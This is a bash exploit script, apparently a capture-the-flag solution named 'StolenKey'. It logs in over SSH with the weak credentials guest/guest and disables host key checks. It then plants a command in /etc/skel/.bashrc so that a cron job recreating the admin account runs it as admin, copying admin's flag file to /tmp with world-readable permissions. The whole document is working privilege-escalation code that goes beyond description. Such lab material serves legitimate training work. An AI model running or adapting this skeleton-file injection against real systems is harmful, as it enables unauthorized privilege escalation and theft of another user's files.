#!/bin/bash
# StolenKey exp: plant a command in /etc/skel/.bashrc, then wait for the
# per-minute cron job to recreate admin and execute it as admin.
#
# usage: ./exp.sh [host] [port]
set -euo pipefail

HOST="${1:-127.0.0.1}"
PORT="${2:-58022}"

SSH_OPTS=(
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o ControlMaster=auto
  -o ControlPath="/tmp/stolenkey-%r@%h:%p"
  -o ControlPersist=120
  -p "$PORT"
)

if command -v sshpass >/dev/null 2>&1; then
  SSH=(sshpass -p guest ssh "${SSH_OPTS[@]}")
else
  SSH=(ssh "${SSH_OPTS[@]}")
fi

echo "[*] planting payload in /etc/skel/.bashrc on ${HOST}:${PORT}"
"${SSH[@]}" "guest@${HOST}" \
  "echo 'cp ~/.flag /tmp/flag && chmod 644 /tmp/flag' >> /etc/skel/.bashrc"

echo "[*] waiting for the admin login job (up to 90s)"
for _ in $(seq 1 18); do
  sleep 5
  flag="$("${SSH[@]}" "guest@${HOST}" 'cat /tmp/flag 2>/dev/null' || true)"
  if [ -n "$flag" ]; then
    echo "[+] ${flag}"
    exit 0
  fi
done

echo "[-] flag not found; verify the payload and wait for the next cron run" >&2
exit 1
